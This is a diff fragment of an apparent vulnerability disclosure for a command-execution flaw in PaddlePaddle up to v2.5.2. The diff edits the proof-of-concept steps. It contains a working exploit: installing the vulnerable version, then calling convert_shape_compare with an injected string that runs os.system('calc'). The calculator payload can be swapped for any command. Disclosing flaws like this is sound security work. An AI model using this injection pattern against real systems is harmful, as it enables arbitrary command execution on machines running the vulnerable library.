@@ -10,14 +10,14 @@ Baidu.Inc PaddlePaddle's Official lib paddle exists Command Execute Vulnerabilit
 
 ## [](#header-3)PROVE: 
 
-0、Prepare a computer which could run python and windows10
+0、Prepare a computer which could run Python3 and Windows10
 
 1、Download Paddle latest version(or <= v2.5.2)  
 ```
 pip3 install paddlepaddle==2.5.2
 ```
 
-2、Run Python3, Run belowing code in python  
+2、Run Python3, Construct a payload that can run calculator, And run belowing code in python  
 ```py
 import paddle
 paddle.jit.dy2static.convert_operators.convert_shape_compare('prefix','+ str(__import__("os").system("calc")) +','1')
